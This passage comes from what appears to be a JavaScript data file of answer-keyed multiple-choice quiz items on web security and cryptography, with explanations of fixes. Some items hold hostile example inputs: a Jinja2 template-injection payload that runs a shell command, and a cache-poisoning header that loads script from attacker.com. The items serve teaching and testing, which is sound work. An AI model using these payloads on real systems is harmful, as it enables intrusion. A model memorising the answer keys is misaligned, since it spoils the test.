      { id: 'opt-d', label: 'D', text: 'Local File Inclusion (LFI) via stream wrappers; caused by passing unvalidated user input directly to file-execution include directives.', isCorrect: true }
    ],
    explanation: 'Local File Inclusion (LFI) occurs when application code passes user-controlled parameters into file include or execute statements (such as PHP\'s include, require, or file_get_contents). Attackers leverage PHP stream wrappers (php://filter, data://, zip://) or directory traversal to read sensitive server files or execute arbitrary code.'
  },

  // 18. Secure File Upload Architecture (Unsafe File Upload) -> Correct Answer: A
  {
    id: 'web-18',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application allows users to upload profile avatar pictures (POST /upload). The server validates that the upload file extension ends in .jpg or .png and saves files directly into the publicly accessible web root directory /var/www/html/uploads/avatar.php.png. An attacker uploads a file containing PHP code disguised with a double extension. When requested via browser, the server executes the PHP code as a web shell. Which set of secure upload practices prevents this vulnerability?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Store uploaded files outside the public web root directory, re-encode image files to strip metadata/code, assign server-generated random UUID filenames, disable script execution permissions on storage directories, and serve files through a dedicated media gateway with Content-Type: image/png and X-Content-Type-Options: nosniff.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Change the upload directory permissions to chmod 777 so the web server can overwrite malicious files.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Use client-side JavaScript to check file size before uploading to the server.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Encrypt uploaded file names using Base64 encoding in the HTTP POST body.', isCorrect: false }
    ],
    explanation: 'Storing user uploads inside the web root with original or predictable extensions permits attackers to upload code (web shells) and execute it by navigating to the file URL. Secure file upload architecture mandates storing files outside the web root, renaming files with random UUIDs, validating MIME types via deep content inspection (or re-encoding images), turning off execution bits on upload directories, and serving files with strict content headers.'
  },

  // 19. IDOR / BOLA Authorization (IDOR / BOLA) -> Correct Answer: C
  {
    id: 'web-19',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An online portal exposes a REST API endpoint for retrieving user invoice details: GET /api/v1/invoices/10842. User 550 logs in, inspects browser developer tools, changes the invoice ID parameter in the URL request to GET /api/v1/invoices/10841, and successfully views another user\'s private financial statement. What vulnerability is present, and what is the primary fix?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Cross-Site Request Forgery (CSRF); fixed by setting SameSite=Strict on session cookies.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Broken Function Level Authorization (BFLA); fixed by hiding the invoice button in the HTML user interface.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA); fixed by enforcing server-side authorization checks verifying that the authenticated user object owns or has permission to access invoice 10841.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'SQL Injection; fixed by replacing integer invoice IDs with SHA-256 hashes.', isCorrect: false }
    ],
    explanation: 'Insecure Direct Object Reference (IDOR), also known as Broken Object Level Authorization (BOLA), occurs when an application uses user-supplied keys to access database objects without verifying that the currently authenticated user has authorization to access that specific object. Fixes require server-side permission verification (where invoice_id = :id AND tenant_user_id = :current_user) on every resource access request.'
  },

  // 20. Mass Assignment & Over-Posting (Privilege Escalation) -> Correct Answer: B
  {
    id: 'web-20',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A Node.js web application updates user profile details using Express and Mongoose: app.put(\'/api/user/profile\', async (req, res) => { await User.findByIdAndUpdate(req.user.id, req.body); });. The user model contains fields email, bio, and is_admin: Boolean. An attacker submits JSON body {"bio": "Hello", "is_admin": true} and grants themselves full administrative privileges. What vulnerability was exploited, and how is it mitigated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SQL Injection; mitigated by converting Mongoose schemas into PostgreSQL tables.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Mass Assignment / Over-Posting; mitigated by using explicit DTO (Data Transfer Object) field whitelisting or picking only permitted fields (email, bio) from req.body rather than binding raw request objects directly to data models.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Broken Authentication; mitigated by requiring 60-character passwords on user registration.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Server-Side Request Forgery; mitigated by blocking outbound connections on the web server.', isCorrect: false }
    ],
    explanation: 'Mass Assignment (Over-Posting) happens when software frameworks automatically bind client-provided HTTP request parameters directly to internal object properties or database models without filtering. If sensitive properties (like is_admin, role, account_balance) exist on the model, attackers can inject them into request payloads. Mitigation requires explicitly whitelisting allowed input attributes.'
  },

  // 21. JWT Algorithm Confusion Attack (JWT Security) -> Correct Answer: D
  {
    id: 'web-21',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A microservices application authorizes incoming requests using JSON Web Tokens (JWTs). The authorization server signs JWTs using an RSA private key (RS256). An attacker intercepts a valid JWT, alters the token header to {"alg": "HS256"}, signs the token payload using the public RSA key (obtained from the public jwks.json endpoint) as the HMAC shared secret, and submits the forged token to a microservice. The microservice accepts the forged token as valid. What attack occurred?',
    options: [
      { id: 'opt-a', label: 'A', text: 'JWT Replay Attack; caused by missing exp expiration claims.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Cross-Site Scripting (XSS); caused by unescaped JWT tokens in DOM elements.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Timing Attack; caused by non-constant-time string comparisons in password verification.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'JWT Algorithm Confusion Attack (RSA-to-HMAC); caused by JWT verification libraries trusting the client-supplied alg header to determine signature verification logic rather than enforcing a server-configured algorithm (RS256).', isCorrect: true }
    ],
    explanation: 'In JWT Algorithm Confusion attacks (RSA-to-HMAC), the attacker changes the header algorithm from asymmetric RS256 to symmetric HS256. If the receiving server blindly trusts the header alg field, it uses its configured public key (which is public knowledge) as the HMAC secret key. Because the attacker knows the public key, they can sign forged tokens using HMAC-SHA256 that pass verification. Servers must enforce explicit, expected algorithm verification rules independently of client token headers.'
  },

  // 22. OAuth Redirect URI Wildcard Validation (OAuth Security) -> Correct Answer: A
  {
    id: 'web-22',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An OAuth 2.0 Authorization Server validates client redirect_uri parameters using substring matching or regex wildcards (e.g., permitting https://app.company.com*). An attacker registers a malicious domain https://app.company.com.attacker.com/callback. The attacker crafts an authorization link requesting an authorization code. When a user authenticates, the authorization server redirects the code to the attacker\'s server. What OAuth flaw occurred, and how is it remediated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Insecure OAuth Redirect URI Validation; remediated by requiring strict, exact string matching against pre-registered, full client redirect URIs without wildcards or loose pattern matching.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Missing PKCE extension; remediated by forcing client applications to use basic authentication headers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'OAuth Scope Creep; remediated by disabling refresh tokens across all mobile clients.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Cross-Site Request Forgery; remediated by setting HttpOnly flags on OAuth access tokens.', isCorrect: false }
    ],
    explanation: 'Loose or wildcard matching on OAuth redirect_uri parameters allows attackers to manipulate the URI to point to external attacker-controlled hosts or open redirectors. Upon successful user authentication, the authorization server dispatches the sensitive authorization code or implicit token to the attacker\'s endpoint. Authorization servers MUST enforce exact-string matching against fully qualified, pre-registered client URIs.'
  },

  // 23. OIDC ID Token Audience Validation (OpenID Connect) -> Correct Answer: C
  {
    id: 'web-23',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An organization operates two separate client applications (Application A and Application B) backed by a shared OpenID Connect (OIDC) Identity Provider. An attacker logs in to Application A, receives a valid id_token issued for Application A (aud: "client_app_a"), and submits this id_token to Application B\'s login endpoint. Application B accepts the token and logs the attacker in under the victim\'s identity. Which security claim check did Application B fail to perform?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Application B failed to check the sub (subject) claim in the ID token.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Application B failed to verify that the token was transmitted over port 8080.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Application B failed to validate the aud (audience) claim in the ID token, permitting a token issued for Client App A to be replayed against Client App B.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Application B failed to decrypt the token using TLS 1.2 client certificates.', isCorrect: false }
    ],
    explanation: 'In OIDC token verification, validating the aud (audience) claim is critical. The aud claim identifies the specific client application for which the ID token was generated. If a client application fails to verify that aud matches its own assigned Client ID, an attacker can reuse a legitimate ID token obtained from another client application in the same identity ecosystem to compromise user sessions.'
  },

  // 24. Broken Function Level Authorization (API Security) -> Correct Answer: B
  {
    id: 'web-24',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A cloud management dashboard hides the "Delete Account" button in the client-side UI for non-administrator users. However, the underlying API endpoint DELETE /api/v1/accounts/:id relies solely on verifying that the request contains a valid user session token, without checking if the user object possesses the ADMINISTRATOR role. A regular employee uses cURL to issue an HTTP DELETE request to the endpoint and successfully wipes an enterprise account. What vulnerability is present?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Insecure Direct Object Reference (IDOR).', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Broken Function Level Authorization (BFLA); occurring when applications fail to enforce role/permission access controls on administrative server endpoints, relying improperly on client-side UI hiding.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Cross-Site Scripting (XSS).', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Server-Side Template Injection (SSTI).', isCorrect: false }
    ],
    explanation: 'Broken Function Level Authorization (BFLA) occurs when sensitive administrative API functions or business logic endpoints fail to perform server-side role and permission authorization checks. Developers mistakenly assume that omitting or hiding administrative options in client-side HTML/JS components prevents unauthorized users from discovering and invoking backend API routes.'
  },

  // 25. Rate Limiting Headers & IP Spoofing (Rate Limiting) -> Correct Answer: D
  {
    id: 'web-25',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An API gateway implements login rate limiting to prevent password brute-force attacks by tracking failed attempts per IP address using the header X-Forwarded-For. An attacker automates a login dictionary attack, appending a distinct random IP address header (X-Forwarded-For: 1.2.3.4, 1.2.3.5, etc.) to every HTTP POST request, bypassing the rate limit entirely. How should rate limiting be properly configured?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Increase the rate limit threshold from 5 requests per minute to 500 requests per minute.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Rely strictly on client-side JavaScript timers to block repeated form submissions.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Disable HTTP POST requests across all login endpoints.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Extract source IP addresses only from trusted upstream reverse-proxy connection sockets (stripping untrusted client headers), and enforce multi-dimensional rate limiting tracking both IP address and Target User Account ID.', isCorrect: true }
    ],
    explanation: 'The X-Forwarded-For HTTP header is easily spoofed by clients unless overwritten or managed strictly by a trusted edge reverse proxy. Furthermore, rate limiting by IP address alone fails against distributed botnets. Proper rate limiting requires extracting IP addresses strictly from trusted proxy network sockets and enforcing rate limits across both IP address and Account/Username targets simultaneously.'
  },

  // 26. Input Validation vs Encoding vs Authorization (Input Validation) -> Correct Answer: A
  {
    id: 'web-26',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer attempts to secure a web application against all attack classes by creating a monolithic regex input validation filter that strips quotes, brackets, and semicolons from all incoming request parameters. Which architectural principle explains why input validation cannot replace context-aware output encoding and parameterized query layers?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Input validation verifies data format, type, and range at entry, but cannot account for diverse execution contexts (HTML, JS, SQL, OS shell); secure architectures apply defense-in-depth where parameterized queries handle SQL, context-aware output encoding handles HTML rendering, and authorization enforces permissions.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Input validation operates exclusively on TLS network packets, whereas output encoding runs on database servers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Input validation is deprecated under OWASP ASVS standards.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Input validation automatically grants full administrative rights to incoming HTTP GET requests.', isCorrect: false }
    ],
    explanation: 'Input validation ensures incoming data conforms to expected formats (e.g. valid age integer, valid zip code). However, input validation alone cannot guarantee security across all downstream interpreters because data needs vary by context. SQL Injection requires parameterized queries, XSS requires context-aware output encoding, and access control requires authorization. Relying on a single input filter creates brittle security prone to bypasses.'
  },

  // 27. Web Cache Poisoning via Unkeyed Headers (Web Cache Security) -> Correct Answer: C
  {
    id: 'web-27',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application uses a CDN reverse proxy cache to speed up static and dynamic page loads. The origin web application uses the unkeyed HTTP header X-Forwarded-Host to dynamically generate JavaScript script tags: <script src="http://" + req.headers[\'x-forwarded-host\'] + "/app.js">. An attacker issues a request containing X-Forwarded-Host: attacker.com. The CDN caches the resulting HTML response and serves it to thousands of subsequent genuine users. What attack occurred?',
    options: [
      { id: 'opt-a', label: 'A', text: 'DNS Cache Poisoning.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'HTTP Request Smuggling.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Web Cache Poisoning; where an attacker manipulates an unkeyed HTTP input to generate a harmful response that is stored by a web cache and served to other users.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Cross-Site WebSocket Hijacking.', isCorrect: false }
    ],
    explanation: 'Web Cache Poisoning occurs when an attacker sends a request containing unkeyed inputs (HTTP headers or parameters not included in the CDN\'s cache key calculation) that causes the origin server to generate a malicious or modified response. The CDN caches this response under a standard cache key (e.g. GET /index.html), serving the poisoned response containing malicious script tags to legitimate visitors.'
  },

  // 28. Cross-Site WebSocket Hijacking (WebSocket Security) -> Correct Answer: B
  {
    id: 'web-28',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A real-time web application establishes WebSocket connections via wss://app.company.com/socket. When initiating the WebSocket HTTP upgrade handshake, the browser automatically attaches ambient session cookies. An attacker hosts a malicious website (https://evil.com) that executes client-side script creating a WebSocket connection to wss://app.company.com/socket. The server completes the upgrade without checking request headers. What vulnerability exists, and how is it fixed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'WebSocket Buffer Overflow; fixed by restricting message length to 64 bytes.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Cross-Site WebSocket Hijacking (CSWSH); fixed by validating the Origin header during the HTTP upgrade handshake and requiring anti-CSRF tokens or short-lived explicit ticket tokens in the connection URL.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Man-in-the-Middle eavesdropping; fixed by switching from WSS to unencrypted WS protocols.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'SQL Injection; fixed by converting WebSocket frames into JSON Web Signatures.', isCorrect: false }
    ],
    explanation: 'Cross-Site WebSocket Hijacking (CSWSH) is a CSRF variant targeting WebSocket HTTP upgrade requests. Because browsers automatically send session cookies during WebSocket handshakes regardless of origin, malicious sites can establish authenticated WebSocket connections on behalf of a victim. Servers MUST validate the Origin header during the upgrade handshake and use anti-CSRF or ticket-based authentication tokens.'
  },

  // 29. Secure Password Reset Flows (Password Reset Flows) -> Correct Answer: D
  {
    id: 'web-29',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer designs a self-service password reset mechanism. When a user requests a reset, the system generates a 6-digit numeric reset token using Math.random(), saves it to the user\'s database record with no expiration time, and sends a reset link. An attacker triggers a password reset for a target user and initiates an automated script guessing digits from 000000 to 999999. Which set of architectural flaws exists in this implementation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The reset flow uses HTTP POST instead of HTTP GET; POST requests cannot send email notifications.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The reset flow lacks CAPTCHA verification on the login landing page.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The reset link should store the user\'s plain-text password in the URL query string.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Use of a non-cryptographically secure pseudo-random number generator (Math.random()), small entropy search space (6 digits) vulnerable to rapid brute-forcing, missing short token expiration (e.g., 15 minutes), and missing single-use token invalidation.', isCorrect: true }
    ],
    explanation: 'Secure password reset flows require high-entropy, cryptographically secure random tokens (e.g., 256-bit secure random bytes), short expiration windows (15 minutes), strict rate-limiting on validation attempts, and single-use invalidation immediately upon password change. Using Math.random() with unthrottled 6-digit tokens allows rapid automated token guessing and account compromise.'
  },

  // 30. Session Invalidation & Stateless Tokens (Session Management) -> Correct Answer: A
  {
    id: 'web-30',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A user logs out of a web application by clicking "Log Out". The client-side JavaScript clears the JWT access token stored in the browser\'s sessionStorage and redirects to /login. However, an attacker obtains a copy of the user\'s JWT access token (intercepted prior to logout) and submits it in an Authorization: Bearer <token> header to API endpoints 30 minutes later. The API server accepts the request. Why did the session termination design fail?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Stateless JWTs remain cryptographically valid until their exp timestamp passes; proper logout requires invalidating refresh tokens, maintaining a server-side token revocation list (or short-lived access tokens), and terminating active session records server-side.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'The browser failed to issue a TCP RST packet to the domain DNS server upon logout.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Client-side sessionStorage is synchronized across all device operating systems automatically.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The JWT token was not encrypted using 4096-bit RSA keys.', isCorrect: false }
    ],
    explanation: 'Merely deleting a stateless JWT token from client browser storage does not invalidate the token on the server. As long as the JWT signature remains valid and the exp timestamp has not expired, anyone possessing the token can present it to API servers. Robust session invalidation requires server-side token blacklisting/revocation, short access token lifetimes (e.g. 5 minutes), and revoking active refresh tokens server-side upon logout.'
  },

  // 31. Subdomain Takeover & CNAME Misconfiguration (Subdomain Takeover) -> Correct Answer: C
  {
    id: 'web-31',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise decommissioned an old marketing campaign hosted on an AWS S3 static website bucket (campaign-2022.s3-website-us-east-1.amazonaws.com) and deleted the S3 bucket. However, the enterprise DNS records still contain an active CNAME record: promo.company.com CNAME campaign-2022.s3-website-us-east-1.amazonaws.com. An attacker creates a new S3 bucket named campaign-2022 in their own AWS account. What attack has been executed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'BGP Route Hijacking.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Cross-Site Scripting (XSS) via DNS TXT records.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Subdomain Takeover; where an attacker claims an orphaned third-party cloud resource pointed to by a lingering CNAME record, gaining full control over content served at promo.company.com.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Server-Side Request Forgery (SSRF).', isCorrect: false }
    ],
    explanation: 'Subdomain Takeover occurs when a domain\'s DNS records contain a CNAME pointing to an external cloud service (S3, GitHub Pages, Heroku, Azure) that has been decommissioned or deleted without removing the DNS CNAME record. Attackers register the matching resource name on the cloud provider, taking full administrative control over traffic arriving at the enterprise subdomain.'
  },

  // 32. GraphQL Query Complexity & Introspection (GraphQL Security) -> Correct Answer: B
  {
    id: 'web-32',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An application exposes a GraphQL API endpoint (POST /graphql). An attacker submits a single HTTP POST request containing a deeply nested query: query { user { friends { friends { friends { friends { friends { name } } } } } } }. The database server experiences 100% CPU utilization and crashes due to resource exhaustion. What vulnerability is present, and what are the primary defenses?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SQL Injection; fixed by converting GraphQL schemas into REST endpoints.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Unconstrained GraphQL Query Depth / Complexity DoS; fixed by enforcing maximum query depth limits, calculating query complexity scores before execution, setting query execution timeouts, and disabling Introspection in production.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Cross-Site Request Forgery; fixed by enforcing SameSite=Strict cookies.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'XML External Entity (XXE) injection; fixed by disabling DTD parsers.', isCorrect: false }
    ],
    explanation: 'GraphQL permits clients to specify exact data query shapes, introducing Denial of Service vulnerabilities through recursive, deeply nested, or broad queries that cause exponential database joins. Defending GraphQL APIs requires enforcing strict query depth limits, query complexity scoring (rejecting queries exceeding budget points), query timeouts, and disabling schema Introspection in production.'
  },

  // 33. Multi-Tenant Data Isolation (Multi-Tenant Authorization) -> Correct Answer: D
  {
    id: 'web-33',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A multi-tenant SaaS application stores customer data in a single multi-tenant database table containing a tenant_id column. To optimize performance, the developers allow client applications to supply their tenant context via an HTTP header: X-Tenant-ID: tenant_123. The backend uses this header directly in database queries. An attacker modifies the header to X-Tenant-ID: tenant_456 and accesses a rival customer\'s data. What architectural boundary was violated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The application used JSON instead of XML payload formats.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The application failed to encrypt database tables using AES-128.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The API used HTTP/1.1 instead of gRPC stream transport protocols.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Untrusted client input was trusted for tenant boundary enforcement; multi-tenant isolation MUST be derived server-side strictly from verified authentication session context (JWT claims or session records) rather than client-controlled headers or parameters.', isCorrect: true }
    ],
    explanation: 'Multi-tenant data isolation is a critical security boundary. Allowing clients to self-assert or override tenant identifiers via HTTP headers, query parameters, or body payloads introduces severe tenant cross-contamination vulnerabilities. Tenant scope MUST be derived exclusively from trusted server-side authentication state (e.g. verified JWT claims signed by the identity provider).'
  },

  // 34. Server-Side Template Injection Execution (SSTI) -> Correct Answer: A
  {
    id: 'web-34',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application uses the Jinja2 templating engine in Python to construct personalized email greetings: template = Template("Hello " + user_input). An attacker submits user_input = "{{ self._TemplateReference__context.namespace.__init__.__globals__[\'os\'].popen(\'id\').read() }}". The server executes the command and returns the shell output inside the email. What vulnerability occurred, and how is it fixed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Server-Side Template Injection (SSTI); fixed by passing user input as context variables (template.render(name=user_input)) into pre-compiled template structures rather than concatenating user input directly into template string definitions.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Reflected XSS; fixed by HTML entity encoding database queries.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Insecure Direct Object Reference (IDOR); fixed by updating database indexes.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Broken Authentication; fixed by requiring 2FA on password reset forms.', isCorrect: false }
    ],
    explanation: 'Server-Side Template Injection (SSTI) occurs when user-supplied input is directly concatenated into a template engine string prior to compilation, allowing attackers to inject template syntax constructs. Template engines expose internal language objects and namespaces, enabling arbitrary Remote Code Execution (RCE). User input must always be passed separately as data variables to template rendering methods.'
  },

  // 35. Cross-Site Script Inclusion / JSON Hijacking (XSSI) -> Correct Answer: C
  {
    id: 'web-35',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An API endpoint returns sensitive user profile JSON data via an authenticated GET request: GET /api/v1/user-profile. The request relies on ambient session cookies for authentication. An attacker hosts a page on an external website containing a <script src="https://target.com/api/user-profile"></script> tag. In legacy browsers or environments vulnerable to prototype manipulation, the script executes and leaks data. What vulnerability class does this represent, and how do modern APIs prevent it?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SQL Injection; prevented by using NoSQL database engines.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Server-Side Request Forgery (SSRF); prevented by blocking public IP addresses.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Cross-Site Script Inclusion (XSSI); prevented by returning JSON responses with anti-parser prefixes (e.g., )]}\'), using HTTP POST for sensitive data, or using X-Content-Type-Options: nosniff alongside JSON object wrappers instead of top-level arrays.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Command Injection; prevented by disabling system shell wrappers.', isCorrect: false }
    ],
    explanation: 'Cross-Site Script Inclusion (XSSI) allows third-party sites to read sensitive data by referencing dynamic JSON/JS endpoints inside <script src="..."> tags, exploiting ambient cookie authentication. Modern APIs prevent XSSI by using X-Content-Type-Options: nosniff, returning JSON objects rather than raw executable arrays, requiring custom authorization headers (e.g., Authorization: Bearer), or prepending anti-parser strings like )]}\'.'
  },

  // 36. Browser MIME Sniffing & nosniff Header (Security Headers) -> Correct Answer: B
  {
    id: 'web-36',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application allows users to upload plain text notes (.txt). When a user views an uploaded file, the web server returns the response with Content-Type: text/plain. However, the file contains HTML and <script> tags. Older browsers inspect the file body, ignore the Content-Type header, determine the content is HTML, and execute the JavaScript. Which HTTP response header explicitly instructs browsers NOT to sniff content types?',
    options: [
      { id: 'opt-a', label: 'A', text: 'X-Frame-Options: SAMEORIGIN', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'X-Content-Type-Options: nosniff', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Strict-Transport-Security: max-age=31536000', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Access-Control-Allow-Credentials: false', isCorrect: false }
    ],
    explanation: 'X-Content-Type-Options: nosniff disables MIME-type sniffing in browsers. MIME sniffing causes browsers to ignore the server-declared Content-Type header and execute executable content (like HTML or JS embedded inside a .txt or .png file), leading to XSS. Setting nosniff forces browsers to strictly adhere to the declared Content-Type.'
  },

  // 37. Financial Race Conditions / TOCTOU (Business Logic Abuse) -> Correct Answer: D
  {
    id: 'web-37',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A user possesses a single-use $100 promotional gift card code. An attacker writes a script that issues 20 concurrent, parallel HTTP POST requests (POST /api/v1/giftcards/redeem) carrying the identical gift card code within a 5-millisecond window. The application checks the database, sees is_redeemed = false for all 20 threads, and credits $2,000 to the attacker\'s account before updating is_redeemed = true. What vulnerability was exploited, and how is it remediated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SQL Injection; remediated by escaping single quote characters.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Cross-Site Request Forgery (CSRF); remediated by adding SameSite cookies.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Insecure Direct Object Reference (IDOR); remediated by encrypting gift card codes with AES-256.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Race Condition / Time-of-Check to Time-of-Use (TOCTOU); remediated by enforcing atomic database operations, isolation locks (SELECT FOR UPDATE), or distributed mutexes during balance redemption checks.', isCorrect: true }
    ],
    explanation: 'A Race Condition (TOCTOU) occurs when an application checks a resource state (Time-of-Check) and acts on it (Time-of-Use) without locking or atomic synchronization across concurrent execution threads. Under parallel requests, multiple threads read the unredeemed state simultaneously before any thread writes the updated state. Remediation requires atomic database transactions, pessimistic locking (SELECT FOR UPDATE), or distributed lock managers.'
  },

  // 38. Defense-in-Depth Web Security Architecture (Defense in Depth) -> Correct Answer: A
  {
    id: 'web-38',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise security team designs a comprehensive defense-in-depth security architecture for a critical web application to mitigate both known and zero-day attack vectors. Which combination of layered controls BEST aligns with defense-in-depth principles across the web stack?',
    options: [
      { id: 'opt-a', label: 'A', text: 'WAF at edge boundary -> API Gateway enforcing rate limits & schema validation -> TLS 1.3 encryption -> Server-side identity & fine-grained RBAC/ABAC authorization -> Parameterized database layer -> Context-aware output encoding & strict Content Security Policy (CSP) in the client browser.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Relying exclusively on a Web Application Firewall (WAF) to filter all malicious payloads while disabling internal application input/output sanitization.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Enforcing client-side JavaScript input validation forms while removing database-level access controls.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Storing all user database passwords in plain text inside local browser cookies protected by IP whitelisting.', isCorrect: false }
    ],
    explanation: 'True defense-in-depth avoids single points of security failure by layering complementary security controls at every tier of the application stack: Edge/Network (WAF, TLS), Gateway (Rate-limiting, Schema validation), Application (Identity, ABAC/RBAC, Business logic), Data Access (Parameterized queries, Least privilege DB credentials), and Browser (Context-aware encoding, CSP, Security headers).'
  },

  // ==========================================
  // 35 HARD / ADVANCED CRYPTOGRAPHY QUESTIONS
  // Correct answers are naturally distributed across A, B, C, and D.
  // ==========================================

  // 1. AES-GCM Nonce Reuse (AEAD / AES-GCM / Nonces) -> Correct Answer: B
  {
    id: 'crypto-1',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An application uses AES-GCM to encrypt sensitive database fields. A developer configures a fixed 96-bit nonce paired with a single static AES-256 key across all encrypted database rows. What is the primary security consequence of this implementation mistake?',
    options: [
      { id: 'opt-a', label: 'A', text: 'AES-GCM automatically rotates the master key internally when a nonce repeats, preserving data confidentiality.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Reusing a nonce under AES-GCM destroys confidentiality by enabling XOR delta plaintext recovery, and allows recovery of the GHASH authentication subkey, enabling arbitrary forgery of valid authentication tags.', isCorrect: true },
